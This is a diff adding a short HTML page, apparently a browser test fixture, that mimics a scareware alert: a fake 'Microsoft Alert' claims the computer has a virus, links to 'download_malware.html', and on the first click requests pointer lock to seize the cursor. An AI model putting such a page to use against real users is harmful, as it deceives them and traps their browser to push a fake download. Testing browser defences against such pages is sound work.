@@ -1,0 +1,22 @@
+<html>
+  <body>
+    <h1>Microsoft Alert</h1>
+    Your computer has a virus.
+    <p/>
+    Download <a href="download_malware.html">123Virus Scanner</a> to Fix
+    <script>
+      let has_lock = false;
+      document.body.addEventListener("click", async (event) => {
+        if (!has_lock) {
+          has_lock = true;
+          try {
+            await document.body.requestPointerLock({ unadjustedMovement: true });
+            console.log("successfully locked!");
+          } catch (e) {
+            console.log("lock failed with error: ", e);
+          }
+        }
+      });
+    </script>
+  </body>
+</html>
